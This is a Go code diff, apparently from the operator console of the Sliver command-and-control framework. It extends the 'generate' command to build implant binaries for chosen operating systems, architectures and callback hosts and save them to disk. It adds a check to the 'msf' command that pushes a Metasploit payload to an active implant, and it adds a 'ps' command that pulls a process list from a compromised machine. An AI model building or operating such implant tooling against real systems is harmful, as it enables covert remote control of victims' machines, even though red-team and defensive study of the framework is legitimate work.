@@ -7,6 +7,7 @@ import (
 	"io"
 	"log"
 	"os"
+	"path/filepath"
 	pb "sliver/protobuf"
 	"strings"
 	"text/template"
@@ -53,6 +54,7 @@ var (
 		"gen":      generate,
 		"generate": generate,
 		"msf":      msf,
+		"ps":       ps,
 	}
 )
 
@@ -219,12 +221,34 @@ func use(term *terminal.Terminal, args []string) {
 }
 
 func generate(term *terminal.Terminal, args []string) {
-	fmt.Fprintf(term, Info+"Generating new sliver binary, please wait ... \n")
-	path, err := GenerateImplantBinary(windowsPlatform, "amd64", *server, uint16(*serverLPort))
+	genFlags := flag.NewFlagSet("gen", flag.ContinueOnError)
+	target := genFlags.String("os", windowsPlatform, "operating system")
+	arch := genFlags.String("arch", "amd64", "cpu architecture (amd64/386)")
+	lhost := genFlags.String("lhost", *server, "sliver server listener lhost")
+	lport := genFlags.Int("lport", *serverLPort, "sliver server listner port")
+	save := genFlags.String("save", "", "save binary file to path")
+	genFlags.Parse(args)
+
+	fmt.Fprintf(term, Info+"Generating new %s/%s sliver binary, please wait ... \n", *target, *arch)
+	path, err := GenerateImplantBinary(*target, *arch, *lhost, uint16(*lport))
 	if err != nil {
 		fmt.Fprintf(term, Warn+"Error generating sliver: %v\n", err)
 	}
-	fmt.Fprintf(term, Info+"Generated sliver binary at: %s\n", path)
+	if *save == "" {
+		fmt.Fprintf(term, Info+"Generated sliver binary at: %s\n", path)
+	} else {
+		saveTo, _ := filepath.Abs(*save)
+		fi, _ := os.Stat(saveTo)
+		if fi.IsDir() {
+			filename := filepath.Base(path)
+			saveTo = filepath.Join(saveTo, filename)
+		}
+		err = copyFileContents(path, saveTo)
+		if err != nil {
+			fmt.Fprintf(term, Warn+"Failed to write to %s\n", saveTo)
+		}
+		fmt.Fprintf(term, Info+"Generated sliver binary at: %s\n", saveTo)
+	}
 }
 
 func msf(term *terminal.Terminal, args []string) {
@@ -234,6 +258,11 @@ func msf(term *terminal.Terminal, args []string) {
 		lhost := msfFlags.String("lhost", "", "metasploit listener lhost")
 		lport := msfFlags.Int("lport", 4444, "metasploit listner port")
 		msfFlags.Parse(args)
+
+		if *lhost == "" {
+			fmt.Fprintf(term, Warn+"Invalid lhost '%s', see `help msf`\n", *lhost)
+			return
+		}
 
 		fmt.Fprintf(term, Info+"Generating %s/%s -> %s:%d ...\n", activeSliver.Os, activeSliver.Arch, *lhost, *lport)
 		config := VenomConfig{
@@ -263,6 +292,37 @@ func msf(term *terminal.Terminal, args []string) {
 			Data: data,
 		}
 		fmt.Fprintf(term, Info+"Sucessfully sent payload\n")
+	} else {
+		fmt.Fprintf(term, Warn+"Please select and active sliver via `use`\n")
+	}
+}
+
+func ps(term *terminal.Terminal, args []string) {
+	if activeSliver != nil {
+		fmt.Fprintf(term, Info+"Requesting process list from %s ...\n", activeSliver.Name)
+
+		data, _ := proto.Marshal(&pb.ProcessListReq{
+			Id: randomID(),
+		})
+		(*activeSliver).Send <- pb.Envelope{
+			Type: "psReq",
+			Data: data,
+		}
+		resp := <-(*activeSliver).Recv
+		psList := &pb.ProcessList{}
+		err := proto.Unmarshal(resp.Data, psList)
+		if err != nil {
+			fmt.Fprintf(term, Warn+"Unmarshaling envelope error: %v\n", err)
+			return
+		}
+
+		header := fmt.Sprintf("\n% 6s | % 6s | %s\n", "pid", "ppid", "executable")
+		fmt.Fprintf(term, header)
+		fmt.Fprintf(term, "%s\n", strings.Repeat("=", len(header)))
+		for _, proc := range psList.Processes {
+			fmt.Fprintf(term, "% 6d | % 6d | %s\n", proc.Pid, proc.Ppid, proc.Executable)
+		}
+		fmt.Fprintf(term, "\n")
 	} else {
 		fmt.Fprintf(term, Warn+"Please select and active sliver via `use`\n")
 	}
